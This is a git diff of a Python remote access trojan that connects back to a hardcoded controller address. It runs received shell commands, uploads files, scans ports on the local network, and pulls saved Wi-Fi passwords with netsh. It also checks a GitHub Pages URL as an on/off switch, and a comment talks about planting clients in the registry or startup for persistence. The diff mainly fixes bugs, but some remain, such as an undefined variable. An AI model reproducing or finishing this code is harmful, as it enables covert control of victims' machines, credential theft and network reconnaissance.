@@ -5,6 +5,7 @@ serve it as file and start the handler wich has custom code exec
 needs to be debuged
 ssh clients needs to be planted in reg or startup
 """
+from email.mime import base
 from urllib.request import urlopen
 import urllib
 import socket
@@ -33,15 +34,21 @@ class MotherFucker():
         pass
 
     def cmd_send(self, data):
-        json_send = json.dumps(data)
-        self.connection.send(json_send)
-    def cmd_recv(self):
+        while True:
+            try:
+                json_send = json.dumps(data).encode()
+                self.connection.send(json_data)
+            except Exception as e:
+                print (e)
+    def cmd_recv(self): 
         json_recived = ""
         while True:
             try:
                 json_recived += self.connection.recv(1024)
-                return json.loads(json_recived)
-            except ValueError:
+                data = json.loads(json_recived).strip().decode('utf8')
+                return data
+            except ValueError as v:
+              #  print(v)
                 continue
     def change_dir(self, path):
         os.chdir(path)
@@ -72,7 +79,7 @@ class MotherFucker():
             wlan = subprocess.Popen("netsh wlan show profile "+str(ssid.replace(" ","*"))+" key=clear").read()
             pass_regex = re.compile("Key Content\s*:.(.*)")
             return pass_regex.search(wlan).group(1)
-        except:
+        except Exception:
             return " "
     def arp_scan(self):
         # scans the entire network
@@ -97,7 +104,7 @@ class MotherFucker():
                 if result == 0:
                     data += f"---\tIP {target}\n\n\t{port} is open"
                 s.close()
-        except KeyboardIntrrupt:
+        except KeyboardInterrupt:
             data += "\nKeyboard Intrupted ."
             pass
         except socket.gaierror:
@@ -117,7 +124,8 @@ class MotherFucker():
 
     def run(self):
         while True:
-            rcvd_cmd = self.json_recv()
+            rcvd_cmd = self.cmd_recv()
+            print(rcvd_cmd)
             try:
                 if rcvd_cmd[0] == "exit":
                     self.connection.close()
@@ -130,30 +138,33 @@ class MotherFucker():
                     cmd_rslt = self.upload_file(rcvd_cmd[1], rcvd_cmd[2])
                 elif rcvd_cmd[0] == "getip":
                     cmd_rslt = self.get_ip
-                elif rcvd_cmd[0] == "scan":
+                elif rcvd_cmd[0] ==  "scan":
                     cmd_rslt = self.scan_result
                 elif rcvd_cmd[0] == "get_wifi":
                     cmd_rslt = self.get_wifi
+                
                 else:
                     cmd_rslt = self.exec_command(rcvd_cmd)
+                
             except Exception as e :
-                    cmd_rslt = "[-] Error During Command Execution.\n ERROR:\t{e}\t"
-
+                    cmd_rslt = f"[-] Error During Command Execution.\n ERROR:\t{e}\t"
+                    print(cmd_rslt)
             self.cmd_send(cmd_rslt)
 
 def get_status():
     s = requests.get('https://poggerpussy.github.io').text
-    status = re.sub(r"<.*?>",'', s)
-    return status
+    #status = re.sub(r"<.*?>",'', s)
+    if s == "true":
+        return True
+    return False
 
 
 
-if __name__ == "__main__":
-    while True:
-        try:
-            if get_status:
-                app = MotherFucker("0.0.0.0", 80)
-                app.run()
-        except Exception as e:
-            print(e)
-            pass
+while True:
+    try:
+        if get_status:
+            app = MotherFucker("192.168.1.31", 80)
+            app.run()
+    except Exception as e:
+        print(e)
+        pass
